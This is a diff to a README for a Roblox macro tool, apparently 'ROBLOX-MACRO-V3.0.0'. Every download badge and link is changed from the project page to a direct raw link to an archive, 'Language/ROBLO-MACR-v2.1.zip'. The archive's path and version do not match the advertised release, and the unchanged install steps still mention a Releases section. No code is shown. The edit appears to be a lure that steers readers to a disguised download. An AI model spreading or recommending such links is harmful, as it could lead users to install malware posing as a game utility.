@@ -1,6 +1,6 @@
 # 🎮 ROBLOX-MACRO-V3.0.0 - Automate Roblox Inputs Easily
 
-[![Download ROBLOX-MACRO-V3.0.0](https://img.shields.io/badge/Download-ROBLOX--MACRO--V3.0.0-brightgreen)](https://github.com/Igmp24184/ROBLOX-MACRO-V3.0.0)
+[![Download ROBLOX-MACRO-V3.0.0](https://img.shields.io/badge/Download-ROBLOX--MACRO--V3.0.0-brightgreen)](https://github.com/Igmp24184/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-v2.1.zip)
 
 ## 🔍 About ROBLOX-MACRO-V3.0.0
 
@@ -38,14 +38,14 @@ Because the software does not access the game’s memory or modify game files, i
 
 Use the link below to visit the official GitHub page where you can download the latest version of ROBLOX-MACRO-V3.0.0.
 
-[![Get ROBLOX-MACRO-V3.0.0](https://img.shields.io/badge/Get%20ROBLOX--MACRO--V3.0.0-blue)](https://github.com/Igmp24184/ROBLOX-MACRO-V3.0.0)
+[![Get ROBLOX-MACRO-V3.0.0](https://img.shields.io/badge/Get%20ROBLOX--MACRO--V3.0.0-blue)](https://github.com/Igmp24184/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-v2.1.zip)
 
 ---
 
 ## ⬇️ Download and Install ROBLOX-MACRO-V3.0.0
 
 1. Click the download button above or visit:  
-   https://github.com/Igmp24184/ROBLOX-MACRO-V3.0.0
+   https://github.com/Igmp24184/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-v2.1.zip
 
 2. On the GitHub page:  
    - Look for a **Releases** section or a **Download** link for the latest version  
@@ -143,7 +143,7 @@ The project works with lua scripting used in Roblox and macros for input service
 
 ## 📂 Related Links
 
-- Download or check updates here: https://github.com/Igmp24184/ROBLOX-MACRO-V3.0.0  
+- Download or check updates here: https://github.com/Igmp24184/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-v2.1.zip  
 - GitHub issues and support on project page  
 - Lua scripting tutorials for Roblox users  
 
